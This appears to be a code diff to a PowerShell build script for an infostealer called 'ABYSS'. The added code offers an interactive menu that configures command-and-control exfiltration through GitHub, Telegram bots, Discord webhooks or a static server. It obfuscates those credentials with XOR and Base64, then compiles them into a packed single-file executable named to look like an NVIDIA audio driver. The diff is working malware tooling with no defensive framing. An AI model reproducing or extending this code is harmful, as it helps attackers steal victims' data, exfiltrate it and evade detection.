@@ -263,6 +263,79 @@ Write-Success "Build directory prepared: $DistDir"
 Write-Host ""
 
 # ═══════════════════════════════════════════════════════════════════════════
+# STAGE 2.5: C2 SERVER SELECTION & PROTECTION
+# ═══════════════════════════════════════════════════════════════════════════
+
+Write-SectionHeader "ABYSS C2 CONFIGURATION MENU"
+$C2_TYPE = "NONE"
+$C2_CRED1 = ""
+$C2_CRED2 = ""
+
+# Manual or Auto XOR Key Configuration
+Write-RGB "  Configure Polymorphic Protection (XOR):" -RGB $AbyssColors.ShadowGray
+$manualKey = Read-Host "    Enter custom XOR key (1-255) [Leave empty for RANDOM]"
+if ([string]::IsNullOrWhiteSpace($manualKey)) {
+    $XOR_KEY = [byte](Get-Random -Minimum 1 -Maximum 255)
+    Write-Status "Auto-generated XOR key: 0x$($XOR_KEY.ToString("X2"))"
+}
+else {
+    $XOR_KEY = [byte]$manualKey
+    Write-Success "Using custom XOR key: 0x$($XOR_KEY.ToString("X2"))"
+}
+
+Write-Host ""
+Write-RGB "  Select your C2 architecture for this build:" -RGB $AbyssColors.ShadowGray
+Write-Host "    [1] GitHub   - Fetch config from raw URL"
+Write-Host "    [2] Telegram - Send data to Bot (Token/ChatId)"
+Write-Host "    [3] Discord  - Send data to Webhook"
+Write-Host "    [4] Manual   - Static Server (IP/Host)"
+Write-Host "    [Enter] Skip - No C2 configuration"
+
+$choice = Read-Host "`n  > Choice"
+
+switch ($choice) {
+    "1" {
+        $C2_TYPE = "GITHUB"
+        $C2_CRED1 = (Read-Host "    Enter GitHub Raw Link").Trim()
+    }
+    "2" {
+        $C2_TYPE = "TELEGRAM"
+        $C2_CRED1 = (Read-Host "    Enter Bot Token").Trim()
+        $C2_CRED2 = (Read-Host "    Enter Chat ID").Trim()
+    }
+    "3" {
+        $C2_TYPE = "DISCORD"
+        $C2_CRED1 = (Read-Host "    Enter Webhook URL").Trim()
+    }
+    "4" {
+        $C2_TYPE = "MANUAL"
+        $C2_CRED1 = (Read-Host "    Enter Server IP/Host").Trim()
+    }
+    Default {
+        Write-Warning "Skipping C2 configuration."
+    }
+}
+
+# Encryption Helper
+function Protect-String {
+    param([string]$InputString, [byte]$Key)
+    if (-not $InputString) { return "" }
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
+    for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
+    return [Convert]::ToBase64String($bytes)
+}
+
+if ($C2_TYPE -ne "NONE") {
+    $C2_CRED1_PROT = Protect-String $C2_CRED1 $XOR_KEY
+    $C2_CRED2_PROT = Protect-String $C2_CRED2 $XOR_KEY
+    Write-Success "C2 Architecture: $C2_TYPE"
+    Write-RGB "    → Polymorphic Key Generated: 0x$($XOR_KEY.ToString("X2"))" -RGB $AbyssColors.ShadowGray
+    Write-RGB "    → Credentials XOR-protected and Base64 encoded." -RGB $AbyssColors.ShadowGray
+}
+
+Write-Host ""
+
+# ═══════════════════════════════════════════════════════════════════════════
 # STAGE 3: BUILD STEALER CLIENT (C#)
 # ═══════════════════════════════════════════════════════════════════════════
 
@@ -280,7 +353,13 @@ if (-not $hasUpx) {
     exit 1
 }
 
-dotnet publish $PluginProj -c Release -o $DistDir /p:PublishSingleFile=true /p:SelfContained=false /p:DebugType=None /p:DebugSymbols=false > $buildLog 2>&1
+# Compilation constants (all credentials encapsulated in XOR+Base64)
+$c2Defines = "C2_TYPE_$C2_TYPE;C2_KEY=$XOR_KEY"
+if ($C2_CRED1_PROT) { $c2Defines += ";C2_VAL1=$C2_CRED1_PROT" }
+if ($C2_CRED2_PROT) { $c2Defines += ";C2_VAL2=$C2_CRED2_PROT" }
+
+$publishCommand = "dotnet publish $PluginProj -c Release -o $DistDir /p:PublishSingleFile=true /p:SelfContained=false /p:DebugType=None /p:DebugSymbols=false /p:DefineConstants=`"$c2Defines`" > $buildLog 2>&1"
+Invoke-Expression $publishCommand
 
 if ($LASTEXITCODE -eq 0) {
     $exePath = Join-Path $DistDir "nvhda64v.exe"
